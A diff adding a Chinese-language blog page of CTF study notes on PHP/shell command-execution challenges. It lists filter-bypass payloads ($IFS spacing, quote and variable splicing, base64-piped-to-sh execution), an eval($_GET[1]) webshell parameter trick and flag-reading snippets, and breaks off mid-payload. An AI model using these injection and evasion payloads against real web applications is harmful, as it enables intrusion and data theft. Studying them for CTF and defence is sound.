@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="# 命令执行做题总结  # 命令执行  ##### 1.命令执行的基本绕过  ###### 1.*** 空格过滤***  123456789101.&gt; &lt; &lt;&gt; 重定向符2.%09(需要php环境)3.$&#123;IFS&#125;4.$IFS$95.$IFS\6.&#123;cat,flag.php&#125; &#x2F;&#x2F;用逗号实现了空格功能7.%208.%09  注：在e">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行做题总结">
+<meta property="og:url" content="http://example.com/2026/09/16/39-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Glut4micum">
+<meta property="og:description" content="# 命令执行做题总结  # 命令执行  ##### 1.命令执行的基本绕过  ###### 1.*** 空格过滤***  123456789101.&gt; &lt; &lt;&gt; 重定向符2.%09(需要php环境)3.$&#123;IFS&#125;4.$IFS$95.$IFS\6.&#123;cat,flag.php&#125; &#x2F;&#x2F;用逗号实现了空格功能7.%208.%09  注：在e">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-09-16T14:20:11.000Z">
+<meta property="article:modified_time" content="2026-09-16T14:20:11.000Z">
+<meta property="article:author" content="谷氨酸棒状杆菌">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2026/09/16/39-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>命令执行做题总结 | Glut4micum</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Glut4micum</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/09/16/39-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://ice.frostsky.com/2024/03/16/1776051b6463e644bf0eb40aed808727.md.jpeg">
+      <meta itemprop="name" content="谷氨酸棒状杆菌">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Glut4micum">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          命令执行做题总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2026-09-16 22:20:11" itemprop="dateCreated datePublished" datetime="2026-09-16T22:20:11+08:00">2026-09-16</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">知识笔记</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="本文总阅读两 fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        
+# 命令执行做题总结
+
+# 命令执行
+
+##### 1.命令执行的基本绕过
+
+###### 1.*** 空格过滤***
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.&gt; &lt; &lt;&gt; 重定向符</span><br><span class="line">2.%09(需要php环境)</span><br><span class="line">3.$&#123;IFS&#125;</span><br><span class="line">4.$IFS$9</span><br><span class="line">5.$IFS\</span><br><span class="line">6.&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">7.%20</span><br><span class="line">8.%09</span><br><span class="line"> </span><br><span class="line"> 注：在eval使用带有$的字符串时，需要进行用\转义，因为$在php中有特殊含义</span><br></pre></td></tr></table></figure>
+
+###### 2.***敏感字符过滤***
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用变量拼接</span><br><span class="line"></span><br><span class="line">$a=l;$b=s;$a$b</span><br><span class="line">拼接起来就是：ls（用来展示文件目录的）</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">利用base64编码绕过</span><br><span class="line"></span><br><span class="line">echo Y2F0IGZsYWcucGhw|base64 -d|sh  Y2F0IGZsYWcucGhw|base64是cat flag.php的base64的编码</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用单引号，双引号，反斜线,1 , 1,1,@等来绕过</span><br><span class="line"></span><br><span class="line">	1.ca&quot;&quot;t fla&quot;&quot;g</span><br><span class="line">	2.ca\t fl\ag</span><br><span class="line">	3.c$1at gh$@twf01.txt</span><br><span class="line">	4.ca&#x27;&#x27;t fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">内敛绕过，反引号可以命令执行</span><br><span class="line"></span><br><span class="line">cat `ls`:就是将所有的文件全部执行</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">利用Linux的环境变量</span><br><span class="line"></span><br><span class="line">1. echo $&#123;PATH&#125;   ///usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">2. echo $&#123;PATH:1:9&#125;//usr/local</span><br><span class="line">3. $&#123;PATH:5:1&#125;    //l</span><br><span class="line">4. $&#123;PATH:2:1&#125;    //s</span><br><span class="line">5. $&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125; //拼接后是ls,执行命令</span><br><span class="line">6. $&#123;PATH:5:1&#125;s           //拼接后是ls,执行命令</span><br><span class="line">利用的就是对字符串的拼接与截断</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">利用通配符绕过</span><br><span class="line"></span><br><span class="line">*    匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） ls file *</span><br><span class="line">?    匹配任何一个字符（不在括号内时）?代表任意1个字符</span><br><span class="line">[abcd]    匹配abcd中任何一个字符</span><br><span class="line">[a-z]    表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符</span><br></pre></td></tr></table></figure>
+
+###### 3.***cat过滤***（查看网页源码）
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似 </span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看 file -f:报错出具体内容 grep</span><br><span class="line">cp：</span><br><span class="line">mv（英文全拼：move file）命令用来为文件或目录改名、或将文件或目录移入其它位置</span><br><span class="line"></span><br><span class="line">bin目录*</span><br><span class="line">bin为binary的简写，主要放置一些系统的必备执行档（可执行命令）例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls</span><br><span class="line"></span><br><span class="line">paste拼接文件并返回文件内容</span><br></pre></td></tr></table></figure>
+
+###### 4.***括号绕过***
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">不使用括号的函数</span><br><span class="line"></span><br><span class="line">1.echo</span><br><span class="line">2.print</span><br><span class="line">3.die</span><br><span class="line">4.include</span><br><span class="line">5.require</span><br><span class="line">6.include_once</span><br><span class="line">7.require_once</span><br><span class="line">8.isset</span><br><span class="line">9.unset</span><br></pre></td></tr></table></figure>
+
+###### 5.***分号绕过***
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+###### 6.php
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=  &lt;?php 段标签</span><br></pre></td></tr></table></figure>
+
+##### 2.文件包含
+
+#included和require可以直接读txt文件，但是不能直接读php文件*
+
+##### 3.命令分隔
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|(管道符)：前面语句的输出作为后面语句的输入</span><br><span class="line">&amp;：不管前面的语句的对否，后面的语句都要执行</span><br><span class="line">；：前面的语句和后面的语句依次执行</span><br><span class="line">||：只有当前面的语句否，后面的语句才会执行</span><br><span class="line">&amp;&amp;：只有当前面的语句真，后面的语句才会执行</span><br></pre></td></tr></table></figure>
+
+##### 4.grep匹配
+
+grep 是用于匹配输入数据中符合条件的字符串的工具，其匹配过程支持正则表达式，因而匹配能力非常强大。grep 可以从文件或者标准输入设备中读取数据，若不指定任何文件名称，或是所给予的文件名为 `-`，则 grep 会从标准输入设备读取数据，否则从文件读取数据进行匹配。
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep [option] pattern file [file2…]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">1 普通全匹配</span><br><span class="line"></span><br><span class="line">grep apple file.txt</span><br><span class="line">#匹配结果如下，会直接列出匹配的行</span><br><span class="line">apple</span><br><span class="line">apple</span><br><span class="line"></span><br><span class="line">2 正则表达式匹配</span><br><span class="line">匹配行开头:^</span><br><span class="line">grep ^a file.txt   //匹配 a 开头的行，注意是要该行的开头是 a 才会匹配。如果不是                       在开头出现，即使中间出现了也不会匹配该行</span><br><span class="line">匹配行结尾:$</span><br><span class="line">grep a$ file.txt    //匹配 a 结尾的行，注意是要该行的结尾是 a 才会匹配。</span><br><span class="line"></span><br><span class="line">匹配单词开头:\&lt;</span><br><span class="line">grep &#x27;\&lt;app&#x27;         #匹配app开头的单词所在的行，例如apple，注意要有引号</span><br><span class="line"></span><br><span class="line">匹配单词结尾:\&gt;</span><br><span class="line">grep &#x27;le\&gt;&#x27;          #匹配le结尾的单词所在的行，例如apple，注意要有引号</span><br><span class="line"></span><br><span class="line">单词锁定匹配:\b</span><br><span class="line">grep &#x27;\bgrep\b&#x27;        #只匹配单词grep，例如不会匹配到grepa </span><br><span class="line"></span><br><span class="line">字符匹配</span><br><span class="line">.		//grep .a file.txt #匹配任意一个字符 例如 aa,ba等</span><br><span class="line"></span><br><span class="line">[]		//grep &quot;[abc]c&quot; file.txt #匹配[]里的任意一个字符，例如ac或者bc或者             cc，注意加引号</span><br><span class="line">		  grep &quot;[a-z]a&quot; file.txt #匹配a-z间的26个字母任意一个字符，例如aa</span><br><span class="line">	</span><br><span class="line">[^]		//grep &quot;[^ab]a&quot; #匹配除ab之外的任意一个字符，例如da</span><br><span class="line">	</span><br><span class="line">\w		//grep &quot;\w&quot;  file.txt #匹配文字和数字字符，也就是[A-Za-z0-9]</span><br><span class="line"></span><br><span class="line">\W		//grep &quot;\W&quot;  file.txt #\w的反置形式，匹配一个或多个非单词字符，如点号           句号等</span><br><span class="line"></span><br><span class="line">次数限定匹配</span><br><span class="line">*		//grep &quot;a*b&quot; file.text   # *前面的字符重复0到多次，例如b,ab,aab</span><br><span class="line"></span><br><span class="line">\&#123;m\&#125;	//grep &quot;x\&#123;m\&#125;&quot; file.text  #重复字符x，m次，如：grep &#x27;0\&#123;3\&#125;&#x27;匹配           包含3个0的行  </span><br><span class="line"></span><br><span class="line">\&#123;m,\&#125;	//grep &quot;x\&#123;m,\&#125;&quot; file.text #重复字符x,至少m次，如：&#x27;0\&#123;5,\&#125;&#x27;匹配至           少有5个0的行</span><br><span class="line"></span><br><span class="line">\&#123;m,n\&#125;	 //grep &quot;x\&#123;m,n\&#125;&quot;  #重复字符x，至少m次，不多于n次，如：&#x27;0\                    &#123;5,10\&#125;&#x27;匹配5--10个0的行</span><br><span class="line"></span><br><span class="line">拓展匹配模式</span><br><span class="line">?		//grep -E &#x27;go?d&#x27; file.txt  #?匹配0个或1个在其之前的字符，例如这里匹配           gd，god</span><br><span class="line"></span><br><span class="line">+		//grep -E &#x27;go+d&#x27; file.txt #?匹配1个或多个在其之前的字符，例如这里匹配           god，good等</span><br><span class="line"></span><br><span class="line">()		//grep -E &#x27;g(oo)d&#x27; file.text #匹配括号里的字符串，一般都是和其他匹配           模式一起使用，例如 grep -E &#x27;g(oo)?d&#x27; file.text</span><br><span class="line"></span><br><span class="line">|		//grep -E &#x27;god|good&#x27; file.txt #匹配被|分隔的多个字符串，例如此例匹配           god或者good</span><br><span class="line"></span><br><span class="line">     注：1.对于标准 grep，如果在扩展元字符前面加\，grep 会自动启用扩展选项-E</span><br><span class="line">        2.当我们想要把上面的匹配模式所用到的字符当做普通字符来匹配，需要用到转义字            符&quot;\\&quot;，不过如果这些特殊字符是位于&quot;[]&quot;当做的时候，大部分都会自动转义为            普通字符了，除了&quot;-&quot;或者&quot;^&quot;等极少数字符以外。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">option 参数</span><br><span class="line"></span><br><span class="line">1 影响查找过程</span><br><span class="line">-a			//将二进制文档以文本的方式来查找</span><br><span class="line">-d &lt;动作&gt; 	//当指定要查找的含有目录(例如 grep apple ./*)，必须使用这项参数，                否则grep指令将回报信息并停止动作。其中动作支持，skip:跳过目录，                recurse:递归读取目录的数据</span><br><span class="line">-E	 		//开启对拓展匹配模式的支持，如上面的例子</span><br><span class="line">-f			//指定匹配模式规则文件，其内容含有一个或多个匹配模式规则，格式为每行一               个匹配模式规则。</span><br><span class="line">-F			//等同于fgrep命令，也就是fast grep，会把所有的字符都看作普通字符，                也就是说正则表达式中的所有字符表示回其自身的字面意义，不再特殊。</span><br><span class="line">-i			//忽略字符大小写的差别</span><br><span class="line">-r/-R		//此参数的效果和指定&quot;-d recurse&quot;参数相同。</span><br><span class="line">-w			//单词匹配，等同于 &quot;\&lt;word\&gt;&quot;或者&quot;\bword\b&quot;</span><br><span class="line">-y			//忽略关键字符的大小写。(跟-i参数相同)</span><br><span class="line"></span><br><span class="line">2 影响打印结果</span><br><span class="line"></span><br><span class="line">-A &lt;num&gt;	//除了显示符合模式的那一列之外，再显示该行之后num行的内容</span><br><span class="line">-B &lt;num&gt;	//除了显示符合模式的那一列之外，再显示该行之前num行的内容</span><br><span class="line">-b			//在匹配到行的开头标示该行的第一个字符前面总共多少byte数据</span><br><span class="line">-color		//以特定颜色高亮显示匹配关键字</span><br><span class="line">-c			//仅显示匹配行的总行数</span><br><span class="line">-C &lt;num&gt;	//除了匹配的那一行之外，并显示该行之前后各num行的内容，其中C是可以省               略的，可以直接 grep -4 apple file.txt</span><br><span class="line">-h			//在显示匹配的那一行之前，不显示该行所属的文件名称（不加这个参数，匹配               多个文件的时候会显示命中文件的名字）</span><br><span class="line">-H			//在显示匹配的那一行之前，表示该行所属的文件名称（不加这个参数，匹配单               个文件的时候不会显示命中文件的名字）</span><br><span class="line">-l			//只显示命中的文件的名称</span><br><span class="line">-L			//只显示没命中的文件的名称</span><br><span class="line">-n 			//显示命中的行所在的行数</span><br><span class="line">-o			//只显示匹配的部分，不显示该行其他的部分</span><br><span class="line">-P   		//使用perl的正则表达式语法，因为perl的正则更加多元化，能实现更加复杂               的场景。典型用法是匹配指定字符串之间的字符。（-e或-E是匹配扩展正则                表达式，-P是匹配perl正则表达式）</span><br><span class="line">-q			//不显示任何信息</span><br><span class="line">-s			//不显示错误信息</span><br><span class="line">-v			//显示不包含匹配文本的所有行</span><br><span class="line">-V			//显示版本信息</span><br><span class="line">-x			//只显示整行都符合的列。</span><br></pre></td></tr></table></figure>
+
+##### 5.构造无字母数字的webshell
+
+思路：
+
+1. 利用位运算（取反，异或，取或）
+
+1. 利用自增运算符
+
+1. shell下可以利用 . 来执行任意脚本
+Linux文件名支持用glob通配符代替
+
+##### 6.用其它的命令执行函数代替被过滤的函数
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system()    //有回显</span><br><span class="line">passthru()   //用于执行系统命令的，并且会将执行后的结果**进行输出**，主要运用于                  unix系统</span><br><span class="line">exec()    //函数不会将执行后的结果输出，与system功能一样</span><br><span class="line">shell_exec()//用于执行shell命令并将执行的结果以字符串的形式返回，但是不会将结果进               行输出。</span><br><span class="line">popen()       //函数会将执行后的系统命令结果用一个文件指针的形式返回</span><br><span class="line">proc_open()   //执行一个命令，并且打开用来输入/输出的文件指针。类似于popen函数</span><br><span class="line">pcntl_exec()</span><br><span class="line">反引号 同shell_exec()</span><br></pre></td></tr></table></figure>
+
+##### 7.用已知参数传入另一个无限制参数，构造木马
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=eval($_GET[1]);&amp;1=system(&#x27;&#x27;);</span><br></pre></td></tr></table></figure>
+
+##### 8.$(( ))与整数运算 57
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(()) 0</span><br><span class="line">~$(()) -0</span><br><span class="line">$((~$(()))) -1</span><br></pre></td></tr></table></figure>
+
+##### 9.脚本
+
+##### 10.复制重命名绕过（通过复制或者重命名读取php文件内容，然后访问文件得到flag）
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy(&quot;flag.php&quot;,&quot;flag.txt&quot;);</span><br><span class="line">rename(&quot;flag.php&quot;,&quot;flag.txt&quot;);</span><br></pre></td></tr></table></figure>
+
+##### 11.fopen*
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> fread()：读取文件（可安全用于二进制文件）,返回文件的字符串内容，失败时返回false</span><br><span class="line">       fread(fopen($filename,&quot;r&quot;), $size);</span><br><span class="line"></span><br><span class="line">  fgets()：从文件指针中读取一行</span><br><span class="line">       print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行</span><br><span class="line"></span><br><span class="line">  fgetc()：从文件指针中读取字符</span><br><span class="line"></span><br><span class="line">  fgetss()：print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一             行并过滤掉 HTML 标记</span><br><span class="line"></span><br><span class="line">  fgetcsv()：从文件指针中读入一行并解析 CSV 字段</span><br><span class="line">        print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));</span><br><span class="line"></span><br><span class="line">  fpassthru()：输出文件指针处的所有剩余数据。该函数将给定的文件指针从当前的位置读                取到 EOF，并把结果写到输出缓冲区。</span><br><span class="line">          fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOF</span><br><span class="line"></span><br><span class="line">  fscanf() — 从文件中格式化输入</span><br><span class="line">          print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;))</span><br><span class="line"></span><br><span class="line">fopen打开文件指针，popen打开文件指针</span><br><span class="line">          print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));</span><br><span class="line">          </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  构造形式c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line =                         fgetcsv($a);print_r($line);&#125;</span><br><span class="line">         c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);echo 